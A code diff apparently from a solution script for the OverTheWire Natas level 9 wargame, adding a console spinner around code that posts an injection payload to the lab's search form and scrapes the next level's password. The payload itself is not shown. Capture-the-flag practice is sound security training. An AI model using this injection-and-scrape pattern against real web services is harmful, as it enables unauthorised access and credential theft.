@@ -1,9 +1,14 @@
 import re
 import requests
+from halo import Halo
 
 
 def get_natas10_password(natas9_password):
     URL = "http://natas9.natas.labs.overthewire.org"
+    spinner = Halo(text='The password for natas 10 is: ',
+                   spinner='bouncingBar', color="blue")
+    spinner.start()
+
     session = requests.Session()
     session.auth = ("natas9", natas9_password)
 
@@ -11,7 +16,8 @@ def get_natas10_password(natas9_password):
     data = {"needle": injection, "submit": "true"}
     request = session.post(URL, data=data)
     natas10_password = re.findall(r'([a-zA-Z\d]{32})', request.text)[1]
-    print("[!] The password for Natas 10 is: " + natas10_password)
+
+    spinner.succeed(text="The password for natas 10 is: " + natas10_password)
 
     return natas10_password
 
